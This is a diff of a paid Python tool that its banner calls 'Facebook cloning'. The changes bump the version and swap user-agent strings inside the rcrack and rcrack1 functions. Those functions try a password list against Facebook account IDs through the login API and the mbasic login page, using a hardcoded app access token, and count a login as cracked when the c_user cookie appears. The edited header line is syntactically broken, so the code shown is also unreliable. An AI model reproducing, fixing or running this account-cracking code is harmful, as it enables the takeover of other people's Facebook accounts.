@@ -117,7 +117,7 @@ logo=("""\033[1;32m
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m 15.1\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 15.2\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;37m[-]KINGX MR SW4T1
@@ -802,8 +802,8 @@ def rcrack1(ids,passlist):
 			'fb_api_req_friendly_name':'authenticate',
 			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
 			'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-			head = {
-		    "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			head = 'Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.33 Chrome/113.0.5672.163 Mobile Safari/537.36',}
+		    "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": 'Mozilla/5.0 (Linux; Android 9; SM-M107F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36',} "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			url = 'https://b-api.facebook.com/method/auth.login'
 			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 			q = json.loads(po)
@@ -861,7 +861,7 @@ def rcrack(ids,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A507FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.173 Mobile Safari/537.36',}
 			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
@@ -915,7 +915,7 @@ def menu_apikey():
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 (+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m 15.1\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 15.2\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;33m[+]TOOLS  : FACEBOOK CLONING 
